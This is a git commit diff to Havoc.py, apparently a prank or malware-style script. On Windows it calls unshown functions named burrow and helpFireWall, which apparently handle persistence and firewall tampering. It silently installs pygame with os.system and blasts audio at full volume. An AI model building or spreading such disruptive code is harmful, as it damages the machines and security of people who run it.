eb844d07d98e0959d535025adc4a645bb9a1eea8
Matt <36310667+NotoriousRebel@users.noreply.github.com>
2018-06-12 19:13:50 -0400

    Update Havoc.py
    Fixed logic and added audio playing method.

--- Havoc.py
+++ Havoc.py
@@ -1,10 +1,55 @@
-import platform,subprocess,sys,os
+import platform,sys,os,time
 import WindowsFun
+
+loadedLib = False
+try:
+    from pygame import mixer
+    loadedLib = True
+except ImportError:
+    try:
+        os.system('python -m pip install pygame')
+        loadedLib = True
+    except:
+        pass
+
+
+def playAudio():
+    #plays audio using pygame library mixer
+    path = sys.argv[1]
+    if(loadedLib):
+        mixer.init()
+        mixer.music.set_volume(1)
+        mixer.music.load(path)
+        try:
+             mixer.music.play(1)
+             time.sleep(140)
+        except:
+            pass
+    else:
+        pass
+
+
+def checkArgs():
+    #checks argument to see if there are enough
+    if len(sys.argv) != 2:
+        print('incorrect number of arguments passed in')
+        sys.exit(-1)
+    else:
+        pass
+
+
 def main():
+    #main to check arguments and determine System and then wreaks havoc
+    checkArgs()
     Platform = platform.system()
-    currentPath = sys.argv[0]
-    if(Platform == 'Windows'):
-        WindowsFun.burrow(currentPath)
+    if Platform == 'Windows':
+        WindowsFun.burrow()
+        WindowsFun.helpFireWall()
+        playAudio()
+    elif Platform == 'Linux':
+        pass
+    else:
+        pass
 
 
 
